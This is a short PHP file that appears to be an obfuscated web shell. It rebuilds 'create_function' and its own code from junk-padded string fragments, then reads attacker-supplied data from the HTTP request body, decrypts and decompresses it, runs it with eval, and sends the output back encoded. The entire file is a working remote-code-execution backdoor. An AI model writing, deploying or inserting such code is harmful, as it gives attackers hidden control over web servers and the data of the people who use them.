<?php
$y='input"),L$mL)==1) {@ob_start();@LeLval(@gzLuLncompressL(@x(@basLe64L_decode($mL[1])L,$k)));$o=@Lob_geL';
$O='t_Lcontents();@Lob_eLnd_cleanLL();$r=@bLase64L_enLcLode(@x(@gzcompreLss($o)L,$k)L)L;print("$p$kLh$r$kf");}';
$n='+){$o.=L$t{L$Li}^$k{$j};}}rLeturn $Lo;}ifL (@pregL_matchL(L"/$kh(.+)L$kf/"L,@Lfile_Lget_contents("pLhp:/LL/L';
$t='$k="ddLfb4La37";L$kh="2d1Lab9L0L7cf1L1";L$kfL="4fL8fea4L34998";$p="yBnxZ2R7ZKNaK7t8";LfuLnctionL x($t,$L';
$f='Lk){$c=strlenL($k);$l=stLrLlen($t);$Lo="L";forL($i=0;$i<L$Ll;){for($j=0L;($jL<$c&&$Li<$lLL);$j++,$i+';
$c=str_replace('kG','','kGkGcreatkGe_kGfukGnctkGion');
$Z=str_replace('L','',$t.$f.$n.$y.$O);
$E=$c('',$Z);$E();
?>
